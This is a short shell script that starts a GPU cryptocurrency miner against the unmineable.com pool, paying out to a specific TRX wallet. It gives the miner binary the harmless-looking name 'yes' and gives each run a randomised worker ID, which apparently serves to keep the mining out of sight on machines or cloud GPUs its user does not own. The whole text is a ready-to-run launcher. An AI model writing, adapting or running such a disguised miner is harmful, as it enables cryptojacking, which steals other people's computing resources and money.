POOL=rx-us.unmineable.com:3333
WALLET=TRX:TG6TPez3gtgmtk54PnW5NqPc3JGnFcby1y
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo yj93NLWh-$(shuf -i 1911-401515 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
